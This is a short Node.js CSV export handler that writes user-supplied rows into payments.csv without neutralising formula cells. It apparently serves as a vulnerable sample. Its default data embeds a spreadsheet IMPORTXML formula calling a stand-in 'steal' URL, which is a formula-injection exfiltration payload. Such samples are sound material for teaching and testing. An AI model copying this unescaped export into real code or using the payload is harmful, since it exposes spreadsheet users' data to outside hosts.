function exportCsv(req, res) {
  const rows = req.body.rows || [
    ["email", "amount"],
    ["attacker@example.test", '=IMPORTXML("https://example.test/steal","//a")'],
  ];
  const csv = rows.map((row) => row.join(",")).join("\n");

  res.setHeader("Content-Type", "text/csv");
  res.setHeader("Content-Disposition", 'attachment; filename="payments.csv"');
  res.end(csv);
}

module.exports = { exportCsv };
